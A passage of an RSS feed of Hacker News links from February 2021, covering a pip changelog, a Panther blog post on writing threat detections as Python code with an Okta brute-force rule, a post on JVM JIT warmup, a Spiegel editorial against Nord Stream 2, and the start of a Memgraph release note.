<p>We need to encourage open-mindedness and independent thinking. We need to scrutinise best practices and understand them in depth. That’s how we stop the cult.</p>

<hr>



</article></div>]]>
            </description>
            <link>https://domk.website/blog/2021-01-31-cult-of-best-practise.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25990929</guid>
            <pubDate>Mon, 01 Feb 2021 17:37:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pip has dropped support for Python 2]]>
            </title>
            <description>
<![CDATA[
Score 68 | Comments 49 (<a href="https://news.ycombinator.com/item?id=25990891">thread link</a>) | @feross
<br/>
February 1, 2021 | https://pip.pypa.io/en/stable/news/#id4 | <a href="https://web.archive.org/web/*/https://pip.pypa.io/en/stable/news/#id4">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<li><p><strong>PROCESS</strong> Version numbers are now simply <code><span>X.Y</span></code> where the leading <code><span>1</span></code>
has been dropped.</p></li>
<li><p><strong>BACKWARD INCOMPATIBLE</strong> Dropped support for Python 3.1.</p></li>
<li><p><strong>BACKWARD INCOMPATIBLE</strong> Removed the bundle support which was deprecated in
1.4. (#1806)</p></li>
<li><p><strong>BACKWARD INCOMPATIBLE</strong> File lists generated by <cite>pip show -f</cite> are now
rooted at the location reported by show, rather than one (unstated)
directory lower. (#1933)</p></li>
<li><p><strong>BACKWARD INCOMPATIBLE</strong> The ability to install files over the FTP protocol
was accidentally lost in pip 1.5 and it has now been decided to not restore
that ability.</p></li>
<li><p><strong>BACKWARD INCOMPATIBLE</strong> PEP 440 is now fully implemented, this means that
in some cases versions will sort differently or version specifiers will be
interpreted differently than previously. The common cases should all function
similarly to before.</p></li>
<li><p><strong>DEPRECATION</strong> <code><span>pip</span> <span>install</span> <span>--download-cache</span></code> and
<code><span>pip</span> <span>wheel</span> <span>--download-cache</span></code> command line flags have been deprecated and
the functionality removed. Since pip now automatically configures and uses
it’s internal HTTP cache which supplants the <code><span>--download-cache</span></code> the
existing options have been made non functional but will still be accepted
until their removal in pip v8.0. For more information please see
<a href="https://pip.pypa.io/en/stable/reference/pip_install.html#caching">https://pip.pypa.io/en/stable/reference/pip_install.html#caching</a></p></li>
<li><p><strong>DEPRECATION</strong> <code><span>pip</span> <span>install</span> <span>--build</span></code> and <code><span>pip</span> <span>install</span> <span>--no-clean</span></code> are now
<em>NOT</em> deprecated.  This reverses the deprecation that occurred in v1.5.3.
(#906)</p></li>
<li><p><strong>DEPRECATION</strong> Implicitly accessing URLs which point to an origin which is
not a secure origin, instead requiring an opt-in for each host using the new
<code><span>--trusted-host</span></code> flag (<code><span>pip</span> <span>install</span> <span>--trusted-host</span> <span>example.com</span> <span>foo</span></code>).</p></li>
<li><p>Allow the new <code><span>--trusted-host</span></code> flag to also disable TLS verification for
a particular hostname.</p></li>
<li><p>Added a <code><span>--user</span></code> flag to <code><span>pip</span> <span>freeze</span></code> and <code><span>pip</span> <span>list</span></code> to check the
user site directory only.</p></li>
<li><p>Silence byte compile errors when installation succeed. (#1873)</p></li>
<li><p>Added a virtualenv-specific configuration file. (#1364)</p></li>
<li><p>Added site-wide configuration files. (1978)</p></li>
<li><p>Added an automatic check to warn if there is an updated version of pip
available. (#2049)</p></li>
<li><p><cite>wsgiref</cite> and <cite>argparse</cite> (for &gt;py26) are now excluded from <cite>pip list</cite> and
<cite>pip freeze</cite>. (#1606, #1369)</p></li>
<li><p>Add <code><span>--client-cert</span></code> option for SSL client certificates. (#1424)</p></li>
<li><p><cite>pip show --files</cite> was broken for wheel installs. (#1635, #1484)</p></li>
<li><p>install_lib should take precedence when reading distutils config.
(#1642, #1641)</p></li>
<li><p>Send <cite>Accept-Encoding: identity</cite> when downloading files in an attempt to
convince some servers who double compress the downloaded file to stop doing
so. (#1688)</p></li>
<li><p>Stop breaking when given pip commands in uppercase (#1559, #1725)</p></li>
<li><p>pip no longer adds duplicate logging consumers, so it won’t create duplicate
output when being called multiple times. (#1618, #1723)</p></li>
<li><p><cite>pip wheel</cite> now returns an error code if any wheels fail to build. (#1769)</p></li>
<li><p><cite>pip wheel</cite> wasn’t building wheels for dependencies of editable requirements.
(#1775)</p></li>
<li><p>Allow the use of <code><span>--no-use-wheel</span></code> within a requirements file. (#1859)</p></li>
<li><p>Attempt to locate system TLS certificates to use instead of the included
CA Bundle if possible. (#1680, #1866)</p></li>
<li><p>Allow use of Zip64 extension in Wheels and other zip files. (#1319, #1868)</p></li>
<li><p>Properly handle an index or --find-links target which has a &lt;base&gt; without a
href attribute. (#1101, #1869)</p></li>
<li><p>Properly handle extras when a project is installed via Wheel. (#1885, #1896)</p></li>
<li><p>Added support to respect proxies in <code><span>pip</span> <span>search</span></code>.
(#1180, #932, #1104, #1902)</p></li>
<li><p><cite>pip install --download</cite> works with vcs links. (#798, #1060, #1926)</p></li>
<li><p>Disabled warning about insecure index host when using localhost. Based off of
Guy Rozendorn’s work in #1718. (#1456, #1967)</p></li>
<li><p>Allow the use of OS standard user configuration files instead of ones simply
based around <code><span>$HOME</span></code>. (#2021)</p></li>
<li><p>When installing directly from wheel paths or urls, previous versions were not
uninstalled. (#1825, #804, #1838)</p></li>
<li><p>Detect the location of the <code><span>.egg-info</span></code> directory by looking for any file
located inside of it instead of relying on the record file listing a
directory. (#2075, #2076)</p></li>
<li><p>Use a randomized and secure default build directory when possible.
(#1964, #1935, #676, #2122, CVE-2014-8991)</p></li>
<li><p>Support environment markers in requirements.txt files. (#1433, #2134)</p></li>
<li><p>Automatically retry failed HTTP requests by default. (#1444, #2147)</p></li>
<li><p>Handle HTML Encoding better using a method that is more similar to how
browsers handle it. (#1100, #1874)</p></li>
<li><p>Reduce the verbosity of the pip command by default. (#2175, #2177, #2178)</p></li>
<li><p>Fixed <a href="https://github.com/pypa/pip/issues/2031">#2031</a> - Respect sys.executable on OSX when installing from
Wheels.</p></li>
<li><p>Display the entire URL of the file that is being downloaded when downloading
from a non PyPI repository. (#2183)</p></li>
<li><p>Support setuptools style environment markers in a source distribution. (#2153)</p></li>
</div></div>]]>
            </description>
            <link>https://pip.pypa.io/en/stable/news/#id4</link>
            <guid isPermaLink="false">hacker-news-small-sites-25990891</guid>
            <pubDate>Mon, 01 Feb 2021 17:34:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Detections as Code]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25990739">thread link</a>) | @kartikeypan
<br/>
February 1, 2021 | https://blog.runpanther.io/detections-as-code/ | <a href="https://web.archive.org/web/*/https://blog.runpanther.io/detections-as-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <article id="post-1501">

                    
                    
                    
                    
                    
                    <div>
                        
<h4>How modern teams can automate security analysis at scale in the era of everything-as-code.</h4>



<p><em><strong>TL;DR</strong>: Adopt a modern, test-driven methodology for securing your organization with Detections-as-Code.</em></p>



<p>Over the past decade, threat detection has become business-critical and even more complicated. As businesses move to the cloud, manual threat detection processes are no longer able to keep up. How can teams automate security analysis at scale and address the challenges that threaten business objectives? The answer lies in treating threat detections like software or detections-as-code.</p>



<p><em>Watch our&nbsp;</em><a href="https://runpanther.io/webinars/scaling-security-detections-as-code-panther-cedar/"><em><strong>On Demand Webinar: Scaling Security with Detections-as-Code with Cedar</strong></em></a><em>&nbsp;to find out how Cedar uses Panther to leverage Detections-as-Code to build high-signal alerts.</em></p>



<h2 id="what-are-detections"><span id="What_are_Detections"></span>What are Detections?<span></span></h2>



<p>Detections define logic for analyzing security log data to identify attacker behaviors. When a rule is matched, an alert gets sent to your team for containment or investigation.</p>



<h3 id="introduction-to-panther">Introduction to Panther</h3>



<p><a href="https://github.com/panther-labs/panther"><strong>Panther</strong></a>&nbsp;is an open source, security data analytics platform designed to alleviate the problems of traditional SIEMs. Panther is&nbsp;<strong>built</strong>&nbsp;<strong>for security engineers</strong>, by security engineers. Rather than inventing yet another DSL, Panther offers security teams a&nbsp;<strong>Python rules-engine</strong>&nbsp;to write expressive threat detections and automate detection and response at cloud-scale. Its modular and open approach offers easy integrations and&nbsp;<strong>flexible detections</strong>&nbsp;to help you build a modern security operations pipeline.</p>



<h3 id="an-example-detection-in-panther">An Example Detection in Panther</h3>



<p>When writing a detection in Panther, &nbsp;we start with a rule() function which identifies a specific behavior we want to identify. For example, let’s suppose we want to have a detection that sends an alert whenever a brute force Okta login is suspected. The following detection can help identify this behavior with Panther:</p>



<pre><code>from panther_base_helpers import deep_get, okta_alert_context


def rule(event):
    return (deep_get(event, 'outcome', 'result') == 'FAILURE' and
            event['eventType'] == 'user.session.start')


def title(event):
    return 'Suspected brute force Okta logins to account {} due to [{}]'.format(
        deep_get(event, 'actor', 'alternateId'),
        deep_get(event, 'outcome', 'reason'))


def alert_context(event):
    return okta_alert_context(event)</code></pre>



<p><em>Okta Brute Force Login Rule in Panther</em></p>



<p>In the above example:</p>



<ul><li>The rule() function takes one argument of ‘event’ and returns a boolean value.</li><li>The title() function controls the generated alert message sent to analysts. Values from the events can then be interpolated to add helpful contexts.</li></ul>



<p>Rules in Panther can be enabled and tested directly in the Panther UI, or modified and uploaded programmatically with the&nbsp;<a href="https://blog.runpanther.io/panthers-cli-tool/">Panther Analysis tool</a>, which enables you to test, package, and deploy detections via the command-line interface (CLI). And to assist with incident triage, Panther rules contain metadata such as severity, log types, unit tests, runbooks, and more.</p>



<h2 id="detections-as-code-a-new-hope-paradigm"><span id="DetectionsasCode_A_New_(Hope)_Paradigm"></span>Detections-as-Code: A New (Hope) Paradigm<span></span></h2>



<p>Detections-as-Code is a modern, flexible, and structured approach to writing detections that apply software engineering best practices to security. By adopting this new paradigm, teams can build scalable processes for writing and hardening detections to identify sophisticated threats across rapidly expanding environments.</p>



<h2 id="benefits-of-adopting-a-code-driven-workflow"><span id="Benefits_of_Adopting_a_CodeDriven_Workflow"></span>Benefits of Adopting a Code-Driven Workflow<span></span></h2>



<p>Threat detection programs that are fine-tuned for specific environments and systems are the most impactful. By treating detections as&nbsp;<strong>well-written code</strong>&nbsp;that can be tested, checked into source control, and code-reviewed by peers, teams can produce<strong>&nbsp;higher-quality alerts</strong>&nbsp;that reduce fatigue and quickly flag suspicious activity.</p>



<h3 id="1-build-custom-flexible-detections-with-a-programming-language">1- Build Custom, Flexible Detections with a Programming Language</h3>



<div><p>Writing detections in a universally-recognized, flexible, and expressive language such as&nbsp;<strong>Python</strong>&nbsp;offers several advantages instead of using domain-specific languages (DSL) that are too limited. With languages, such as Python, you can write more sophisticated and&nbsp;<strong>tailored detections</strong>&nbsp;to fit the needs specific to your enterprise. These rules also tend to be more readable and easy to understand as the complexity increases.</p><p>Another benefit of this approach is utilizing a rich set of built-in or third-party&nbsp;<strong>libraries</strong>&nbsp;developed by the security community for interacting with APIs or processing data, which increases the effectiveness of the detection.</p></div>



<h3 id="2-test-driven-development-tdd-">2- Test-Driven Development (TDD)</h3>



<p>A proper QA for detection code can enable teams to discover detection blind-spots early on, cover testing for false alerts, and promote&nbsp;<strong>detection efficacy</strong>. A TDD approach allows security teams to think like an attacker, document that knowledge, and curate an internal repository of insight into the attacker’s lifecycle.</p>



<p>The advantage of TDD is more than just validation of code correctness. A TDD approach to writing detections improves the quality of detection code and enables more&nbsp;<strong>modular, extensible, and flexible detections</strong>. Engineers can easily make changes to their detection without fear of breaking alerts or hamstringing everyday operations.</p>



<h3 id="3-collaboration-with-version-control-systems">3- Collaboration with Version Control Systems</h3>



<div><p>When writing new detections or modifying them, version control allows teams to quickly and easily revert to previous states. It also confirms that teams are using the most up-to-date detection rather than referencing outdated or wrong code. Version control can also help give needed context for specific detections that triggered an alert or help pinpoint when detections are changed.</p><p>As new and additional data enters the system over time, detections must also change. A change control process is essential to help teams address and&nbsp;<strong>adjust the detections as needed</strong>, while simultaneously ensuring that all changes are well-documented and well-reviewed.</p></div>



<h3 id="4-automated-workflows-for-reliable-detections">4- Automated Workflows for Reliable Detections</h3>



<p>A Continuous Integration/Continuous Deployment (CI/CD) pipeline can be beneficial for security teams that have long wanted to&nbsp;<a href="https://devops.com/shift-left-without-fear-the-role-of-security-in-enabling-devops/" target="_blank" rel="noreferrer noopener">move security further left</a>. Using a CI/CD pipeline helps achieve the following two goals:</p>



<ul><li>Eliminate&nbsp;<strong>silos</strong>&nbsp;between teams as they work together on a common platform, code-review each other’s work, and stay organized.</li><li>Provide automated testing and delivery pipelines for your security detections. Teams can&nbsp;<strong>stay agile</strong>&nbsp;by focusing on building fine-tuned detections. Instead of manually testing, deploying, and ensuring that the detections aren’t overly tuned, which could trigger false alerts.</li></ul>



<h3 id="5-reusable-code">5- Reusable Code</h3>



<div><p>Last but not least, Detections-as-Code can promote code reusability across a large set of detections. As teams write large numbers of detections over time, they start to see specific patterns emerge. Engineers can&nbsp;<strong>reuse the existing code</strong>&nbsp;to perform the same or very similar function across different detections without starting from scratch.</p><p>Code reusability can be a vital part of detection-writing that allows teams to share functions between detections or modify and adapt detections for specific use-cases. For example, suppose you needed to repeat a set of Allow/Deny lists (let’s say for access management) or a particular processing logic in multiple places. In that case, you can use Helpers in languages such as Python to&nbsp;<strong>share functions</strong>&nbsp;between detections.</p></div>



<h2 id="panther-s-approach-to-detections-as-code"><span id="Panther%E2%80%99s_Approach_to_DetectionsasCode"></span>Panther’s Approach to Detections-as-Code<span></span></h2>



<p>Panther offers reliable and resilient detections that can make it easy to:</p>



<ul><li>Write expressive and&nbsp;<strong>flexible detections in Python</strong>&nbsp;for needs specific to your enterprise.</li><li>Structure and normalize logs into a strict schema that enables detections with Python and&nbsp;<strong>queries with SQL</strong>.</li><li>Perform real-time threat detection and power investigations against&nbsp;<strong>massive volumes</strong>&nbsp;of security data.</li><li>Benefit from&nbsp;<strong>200+ pre-built detections</strong>&nbsp;mapped to specific threats, suspicious activity, and security frameworks like&nbsp;<a href="https://attack.mitre.org/" target="_blank" rel="noreferrer noopener">MITRE ATT&amp;CK</a>.</li></ul>



<figure><img src="https://lh3.googleusercontent.com/RK2uPbvJfk_bMHMCl2QHZDpEfmjVFcfEZ3Rq4bm3Gwvwy18GqBMgtGWHdscyD2sF-A_Xf-uXhbjCboG6bf6apo5lRNHz4OI3u1kljtrRWhpzxQdUk17Xz9eVH6DabIoA7p1VWBSE" alt="The flow of Detections-as-Code in Panther"><figcaption><em>The Flow of Detections-as-Code in Panther</em></figcaption></figure>



<h2 id="get-started"><span id="Get_Started"></span>Get Started<span></span></h2>



<div><p>Are you taking full advantage of all your security data to detect threats and suspicious activity? Follow our&nbsp;<a href="https://docs.runpanther.io/quick-start"><strong>Quick Start</strong></a>&nbsp;Community guide to getting started with Panther or&nbsp;<a href="https://runpanther.io/request-a-demo/"><strong>contact us</strong></a>&nbsp;for a demo.</p><p><em>To learn how you can write custom Python detections in Panther,&nbsp;</em><a href="https://runpanther.io/webinars/writing-custom-python-detections-with-panther/"><em><strong>watch our on-demand webinar</strong></em></a><em>.</em></p><p>Note: This is a two-part blog series on security automation using Detections-as-Code. In Part 2, we’ll show how you can deploy Detections-as-Code with Panther.</p></div>
                                            </div>

                </article>

                
                
                            		        		               
		        
            </div></div>]]>
            </description>
            <link>https://blog.runpanther.io/detections-as-code/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25990739</guid>
            <pubDate>Mon, 01 Feb 2021 17:23:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Continuous delivery makes JVM JIT an anti-pattern]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 33 (<a href="https://news.ycombinator.com/item?id=25990585">thread link</a>) | @foxgrover
<br/>
February 1, 2021 | https://blog.astradot.com/the-jvm-jit-is-an-antipattern-in-a-continuous-delivery-world/ | <a href="https://web.archive.org/web/*/https://blog.astradot.com/the-jvm-jit-is-an-antipattern-in-a-continuous-delivery-world/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>The JVM JIT compiler has long been sold as the way Java is able to compete with the performance of compiled languages like C/C++. Every benchmark for Java will tell you to first run your code many times for 'warmup' before you measure its performance, so that its JITed and optimized by the JVM's C2 compiler .</p><p>In the real world though, the calls to your application <em>before</em> its code is 'warmed up' are very much a part of your application's experience.</p><figure><blockquote><p lang="en" dir="ltr">Every Java benchmark is like ‘ignore first 1M calls to let code be fully JITed’. Yeah but those 1M calls are still part of your application, including that first call that caused the class hierarchy to be loaded. And they are pushing the 99th percentile of your app to the moon!</p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1355754185858420738?ref_src=twsrc%5Etfw">January 31, 2021</a></blockquote>

</figure><h3 id="jvm-jit-and-our-signup-page">JVM JIT and our Signup page</h3><p>Astradot has a Kotlin microservice that takes care of auth activities like signup and login. If you try to signup right after the serviced was redeployed, it feels like the signup page has frozen after you click the 'signup' button. The page can take seconds to respond. It's because the JVM is loading the code of tons of Kotlin/Spring classes for the first time and running it through the interpreter with no optimizations. Sure the response time gets better the more you click the signup button, but the user who was signing up that first time might have thought our system was frozen and gone away. Since we have multiple instances of each microservice running its possible that the 2nd time you try to signup the request goes to a different JVM instance. For that JVM its the first time loading the signup code and so you again encounter the freezing behavior. From the end user's perspective, he has now tried signing up multiple times and encountered slow behavior each time. Thus that is the impression he has of our product now.</p><h3 id="continuous-delivery-kills-jit-compiler-s-core-assumption">Continuous Delivery kills JIT compiler's core assumption</h3><p>One of Astradot's metric collector service gets 500 requests per second per JVM. After a fresh deploy, even at that high throughput it takes a full 2 hours till the JVM C2 compiler is able to fully optimize that code path to get response times drop to their lowest. To put those 2 hours in context, here is a result from Sysdig's latest container usage survey:</p><figure><blockquote><p lang="en" dir="ltr">Latest Sysdig survey shows 74% of containers live &lt; 1 hour. So your Java app perpetually stays in interpreted/C1 non-optimized mode. Those amazing benchmark numbers you got from the C2 JIT, your users will never get to see them. JIT and Continuous Deployment are incompatible. <a href="https://t.co/fqLf7d3f9L">pic.twitter.com/fqLf7d3f9L</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1356183648131719175?ref_src=twsrc%5Etfw">February 1, 2021</a></blockquote>

</figure><p>74% of containers have lifespans ≤ 1 hour. This changes the core assumption behind the JIT compiler that the JVM is a long running process. Your container will get redeployed before it gets optimized by the JVM C2 compiler. Thus your users will never even get to experience that amazing performance that all those JVM benchmarks promised.</p><p>This gets worse for portions of code that are low throughput. Think of that Signup page I talked about earlier. Even if our auth microservice was deployed for days, the <code>signup()</code> function will still not get enough calls to trigger the C2 compiler to fully optimize it. So users will always experience the unoptimized version of that code.</p><h3 id="rise-of-modern-compiled-languages">Rise of modern compiled languages</h3><p>One of the selling points of the JVM JIT compiler was that it has runtime information so it can do better optimization. That might have been true 20 years ago. But Ahead of Time (AOT) compiled languages have evolved since then. Go, which is Garbage Collected like Java, but AOT compiled, is able to achieve similar or better performance. Rust is able to consistently beat Java in benchmarks.</p><p>This is due to the fundamental design of Java. It encourages uses of virtual methods and allocations on heap. A huge part of the JIT optimization revolves around trying to convert those virtual calls to static calls, inline them, perform escape analysis to convert those heap allocations to stack allocations. Go and Rust encourage use of static method calls and stack allocation everywhere by default thus they don't need all the complexity and overhead of a massive JIT to optimize them at runtime.</p><h3 id="aot-compiled-java">AOT Compiled Java</h3><p>There are signs that Java folks are realizing the pitfalls of JIT. GraalVM has an AOT compiler and frameworks like Quarkus and Micronaut are popping up to use them. They have had little uptake though. The dynamic nature of Java means that features like dynamic class loading, reflection, proxies, etc are unavailable or in limited from in AOT. Production Java apps also typically run with APM tracing agents that rely on runtime bytecode instrumentation. The entire JVM ecosystem is simply not designed around AOT compilation. Molding a 25 year old runtime ecosystem to adapt to AOT compilation feels like putting lipstick on a pig. It is easier to start afresh with modern compiled languages like Go and Rust.</p><h3 id="conclusion">Conclusion</h3><p>JVM vendors want you to ignore the fact that large portions of your code could indeed be running on the interpreter or the unoptimized C1 compiler. Continuous Delivery and the resulting frequent JVM restarts mean the core assumption behind the JIT compiler, that JVMs are long running processes, no longer holds.</p><p>At Astradot, we believe <a href="https://movingfulcrum.com/the-era-of-the-jvm-is-coming-to-an-end/">the era of the JVM is coming to an end</a>. We are writing our backend in AOT compiled languages to give you a great experience 100% of the time. &nbsp;We recently <a href="https://blog.astradot.com/why-we-moved-from-kotlin-spring-boot-to-go/">converted our microservices from Kotlin to Go</a> and found it to be a welcome change.</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.astradot.com/the-jvm-jit-is-an-antipattern-in-a-continuous-delivery-world/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25990585</guid>
            <pubDate>Mon, 01 Feb 2021 17:11:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Russian Pipeline Is Germany's Greatest Foreign Policy Embarrassment]]>
            </title>
            <description>
<![CDATA[
Score 78 | Comments 94 (<a href="https://news.ycombinator.com/item?id=25990469">thread link</a>) | @Tomte
<br/>
February 1, 2021 | https://www.spiegel.de/international/germany/a-price-too-high-russian-pipeline-is-germany-s-greatest-foreign-policy-embarrassment-a-0fcefa58-ca51-41ca-b480-98015203e9fa | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/germany/a-price-too-high-russian-pipeline-is-germany-s-greatest-foreign-policy-embarrassment-a-0fcefa58-ca51-41ca-b480-98015203e9fa">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="A Price Too High: Russian Pipeline Is Germany's Greatest Foreign Policy Embarrassment" data-area="article">
<header>
<div>

<div>
<h2>
<span>
A Price Too High
</span>
<span><span>Russian Pipeline Is Germany's Greatest Foreign Policy Embarrassment</span>
</span>
</h2>


<p>
Berlin is insisting on the construction of the Nord Stream 2 gas pipeline between Russia and Germany. By doing so, the country is isolating itself in Europe and alienating the United States. The political costs will be too great if the project is completed. It should now be scrapped.
</p>
<p><time datetime="2021-02-01 17:25:39">01.02.2021, 17.25 Uhr</time>
</p>
</div>
</div>
</header>
<div data-article-el="body">
<section data-app-hidden="">


</section>
<section>
<div>
<figure data-component="Image" data-zoom-id="140dd552-1d59-4395-8e64-c514b0f33c44" data-settings="{&quot;id&quot;:&quot;9fdd3db3-8707-46ea-8d4a-4197034af156&quot;, &quot;zoomable&quot;:true,&quot;zoomId&quot;:&quot;140dd552-1d59-4395-8e64-c514b0f33c44&quot;}">
<p><span>
<span data-image-el="aspect">
<span>
<img data-image-el="img" src="https://cdn.prod.www.spiegel.de/images/9fdd3db3-8707-46ea-8d4a-4197034af156_w948_r1.77_fpx56_fpy56.jpg" srcset="https://cdn.prod.www.spiegel.de/images/9fdd3db3-8707-46ea-8d4a-4197034af156_w520_r1.77_fpx56_fpy56.jpg 520w, https://cdn.prod.www.spiegel.de/images/9fdd3db3-8707-46ea-8d4a-4197034af156_w948_r1.77_fpx56_fpy56.jpg 948w" width="948" height="536" sizes="948px">
</span>
</span>
</span>

</p>
<figcaption>
<span>
Foto: Alexander Demianchuk&nbsp;/ action press
</span>
</figcaption>
</figure>
</div><div>
<p>How much can a natural gas pipeline from Russia be worth to the German government? Is it worth sacrificing Germany’s foreign policy prestige? Is it worth isolating the country within the European Union and straining relations with Joe Biden, the new president of the United States? How can it be reconciled with Germany’s climate targets? And why should the German government back a pipeline that benefits the Russian regime, whose policies it otherwise opposes?</p>


<div>
<p>For years, the German government has stuck to this economically dubious and politically misguided project, the brainchild of Russian President Vladimir Putin and his pal, former Chancellor Gerhard Schröder. The greater the resistance within Europe to the project, the more stubbornly the German government has clung to the endeavor. It is increasingly difficult to find any other explanation for this than pride.</p><p>And this, despite the larger, more fundamental issue question facing Berlin: Can the German government achieve its self-proclaimed target of taking on a more significant role in global politics? Its behavior on Nord Stream 2 thus far suggests the contrary. The pipeline, indeed, has become Germany’s most embarrassing foreign policy problem.</p>
</div>

<p>From the very beginning, Berlin’s claim that the Nord Stream 2 was purely economic and not at all political in nature has been hypocritical. Pipelines are always political. And this is especially true of this pipeline, because Nord Stream 2 would transport natural gas directly from Russia to Germany through the Baltic Sea. It would allow the state-owned company Gazprom to bypass pipelines in Belarus and Ukraine, making the countries even more dependent on Russia because they will lose transit fees they otherwise would have received. The pipeline would also provide an additional source of foreign currency for the Russian government. This runs counter to the spirit of Europe's sanctions against a regime that for years has shown itself to be an adversary of the European Union and has had opposition figure Alexei Navalny poisoned and imprisoned.</p>

<p><strong>The most effective argument used by pipeline proponents</strong> in recent years has been Donald Trump and U.S. sanctions against the project. "We're not going to let them dictate where we buy our gas!" they would say. But Donald Trump has now been voted out of office, and the Americans are by no means the only ones who oppose the pipeline. Indeed, perhaps the strongest argument against Nord Stream 2 doesn’t even have anything to do with the U.S. This pipeline is an anti-European project. And the German government is growing increasingly isolated in the EU on the issue. Almost every Eastern European country is opposed to the project, especially Poland and the Baltic states. The project provides affirmation for critics who view Germany as a two-faced, hegemonic country that speaks of European values but pushes through its own interests in a pinch. Last month, the European Parliament once again voted against the pipeline. There has also been criticism from the European Commission, which wants to reduce dependence on individual supplier countries. Even Paris is voicing skepticism.</p>


<section data-area="contentbox">

</section>
<div>
<p>The pipeline doesn’t even provide any clear economic benefits. It doubles the supply capacity from Russia, but natural gas consumption is stagnating and would have to fall significantly by the middle of the century for Germany to meet its climate targets. The existing pipelines are by far sufficient. Russia is now talking about pumping climate-friendly hydrogen through the pipeline in the future. But those prospects are uncertain and it changes nothing about the political dilemma.</p><p><strong>Of course, the private companies involved</strong> could now try to finish building the last few kilometers of the pipeline, despite the U.S. sanctions – at their own risk. They have invested billions, after all. But the lengths to which some politicians in Germany - particularly within the center-left Social Democratic Party once run by Schröder - are willing to go to support the project has been appalling. Manuela Schwesig, the SPD governor of Mecklenburg-Western Pomerania, where Nord Stream 2’s terminus is located, has even set up a front foundation for environmental protection to complete the environmentally damaging pipeline despite U.S. sanctions. Such shadiness is harmful to Germany's international standing.</p>
</div>
<section>

</section>
<div>
<p>The German government has backed itself into a corner with Nord Stream 2 that can only be explained by economic selfishness or political naivety, but it is ultimately a self-inflicted wound. The time, though, has now come for a clear choice to be made – one that doesn’t chain the country to the pipeline. Nord Stream 2 must be stopped. It would be better to write it off now than to bear the political and economic costs of its completion.</p><p>Angela Merkel should withdraw support for the project, even if that could mean that companies end up having to be compensated. Doing so will be painful politically, but the German government should view the Nord Stream 2 debacle as quittance for the mistakes it has made – and as a lesson for the future.</p>
<p><span><svg aria-labelledby="title-4b68e874-2f30-45b0-b6f5-a4a6fa1d3ebc" width="10" height="20" viewBox="0 0 10 20" fill="none" xmlns="http://www.w3.org/2000/svg" role="img"><title id="title-4b68e874-2f30-45b0-b6f5-a4a6fa1d3ebc">Icon: Der Spiegel</title><g id="l-s-flag-4b68e874-2f30-45b0-b6f5-a4a6fa1d3ebc"><path id="vector-4b68e874-2f30-45b0-b6f5-a4a6fa1d3ebc" d="M9.85 16.293v-8H3.212V4.667h3.533v2.24h3.212v-3.2C9.85 2.747 8.993 2 8.03 2H1.713C.749 2 0 2.747 0 3.707v7.253h6.638v4.373H3.105v-2.986H0v3.84c0 .96.75 1.706 1.713 1.706H8.03c.963.107 1.82-.64 1.82-1.6z" fill="#000"></path></g></svg>
</span>
</p></div>
</div>
</section>

</div>

</article></div>]]>
            </description>
            <link>https://www.spiegel.de/international/germany/a-price-too-high-russian-pipeline-is-germany-s-greatest-foreign-policy-embarrassment-a-0fcefa58-ca51-41ca-b480-98015203e9fa</link>
            <guid isPermaLink="false">hacker-news-small-sites-25990469</guid>
            <pubDate>Mon, 01 Feb 2021 17:02:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Memgraph DB 1.3 release brings high availability replication (HA)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25989934">thread link</a>) | @karimtr
<br/>
February 1, 2021 | https://memgraph.com/blog/memgraph-1-3-release | <a href="https://web.archive.org/web/*/https://memgraph.com/blog/memgraph-1-3-release">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Introduction</h3>
<p>Hello, graph-wrangling, database-lovin’ folks out there! It’s been a long winter for us all, but we’ve made the best out of the cold, dreary days to bring you a whole new bag of tricks to keep you occupied for a while. Without further ado, we’re happy to announce that <a href="https://memgraph.com/download">Memgraph 1.3</a> is officially out!</p>
<p>If there’s one thing we’re proud of, it’s that from now on, the all-new <a href="https://docs.memgraph.com/memgraph/reference-guide/replication">replication feature</a> will enable you to copy and sync your Memgraph database to multiple servers to ensure your data is always available even if your main server goes down.</p>
<p>Of course, we’ve thrown in some extra goodies to spice things up, so read on and bon appetite!</p>
<h2>Replication</h2>
<p>Starting with this release, if you’re a Memgraph Enterprise user, you’ll be able to sync your data between Memgraph instances that run on different machines. In other words, using the replication feature, you’ll be able to create and run clusters of nodes running synced Memgraph instances, ensuring high availability of your graph data.</p>
<p>We provide the <em>main</em>-<em>replica</em> cluster node relationship model (aka leader-follower). A node may take on the role of the main (containing data to be replicated to other nodes), and the nodes that take on the role of replicas work in concert with the main to reconstruct the data present on the main, and keep in sync with it.</p>
<p>To sync data, you’ll be able to choose between the sync, async and semi-sync mode, depending on how hard your consistency requirements are.</p>
<p><img src="https://i.imgur.com/4cO6nOM.png" alt=""></p>
<p>This simple but powerful setup enables you to create highly flexible and fault-tolerant clusters that can be easily configured and deployed anywhere!</p>
<p>“How does it work and how can I try it out?”, you may ask. Head on over to <a href="https://docs.memgraph.com/memgraph/reference-guide/replication">the reference guide</a> for a more in-depth explanation of replication, and check out the <a href="https://docs.memgraph.com/memgraph/database-functionalities/replication">how-to guide</a> to get you replicating in no time!</p>
<h2>Data Directory Locking</h2>
